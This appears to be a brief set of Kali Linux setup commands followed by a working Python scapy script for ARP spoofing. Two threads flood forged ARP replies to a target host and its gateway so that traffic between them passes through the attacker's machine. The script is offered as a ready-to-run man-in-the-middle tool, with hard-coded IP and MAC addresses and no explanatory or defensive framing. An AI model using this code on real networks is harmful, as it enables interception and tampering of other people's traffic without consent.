(kali)
#apt install python3.12-venv -y  or #apt-get install python3-venv -y
#python3 -m venv myenv
#source myenv/bin/activate

(python)
import scapy.all as scapy
from threading import Thread

def spoof(target_ip, target_mac, spoof_ip) :
    while True :
        try:
            packet = scapy.Ether(dst=target_mac) / scapy.ARP(
                    op=2,  # ARP response
                    pdst=target_ip,  # Target IP
                    hwdst=target_mac,  # Target MAC
                    psrc=spoof_ip,  # Spoofed IP (gateway or target)
                    hwsrc=scapy.get_if_hwaddr(scapy.conf.iface)  # Our MAC
                )
            scapy.sendp(packet, verbose=False)
            print(f"Sent to {target_ip}: {spoof_ip} is at our MAC")
        except Exception as e:
            print(e)


target_ip = "192.168.0.100"
target_mac = "58:CD:C9:93:87:0F"
gateway_ip = "192.168.0.1"
gateway_mac = "98:25:4a:b5:41:7d"
t1 = Thread(target=spoof, args=(target_ip, target_mac, gateway_ip))
t2 = Thread(target=spoof, args=(gateway_ip, gateway_mac, target_ip))

t1.start()
t2.start()
